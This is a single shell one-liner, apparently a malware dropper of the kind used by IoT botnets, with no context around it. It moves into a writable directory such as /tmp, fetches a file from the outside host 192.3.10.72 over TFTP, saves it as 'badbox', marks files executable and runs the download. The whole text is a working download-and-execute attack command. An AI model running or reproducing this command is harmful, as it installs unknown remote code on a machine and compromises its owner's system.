cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 192.3.10.72;cat tftp >badbox;chmod +x *;./badbox
